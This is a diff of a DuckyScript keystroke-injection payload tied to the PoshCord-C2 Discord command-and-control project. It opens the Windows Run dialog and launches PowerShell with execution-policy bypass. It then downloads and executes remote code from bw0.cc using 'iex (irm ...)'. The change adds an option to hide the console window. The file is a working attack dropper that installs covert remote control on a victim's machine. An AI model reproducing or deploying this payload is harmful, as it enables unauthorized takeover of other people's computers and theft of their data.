@@ -11,13 +11,12 @@ REM Change BOT_TOKEN below with your bot token
 REM Change CHANNEL_ID below to your channel id
 REM for more info goto - https://github.com/beigeworm/PoshCord-C2
 
-REM some setup for dukie script
-DEFAULT_DELAY 100
+REM To hide the console, use $hide='y' below. 
 
-REM open powershell (remove "-W H" to show the window)
+REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; iex (irm bw0.cc/dcrs)
+STRING powershell -Ep Bypass -C $hide='y'; $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; iex (irm bw0.cc/dcrs)
 ENTER
 
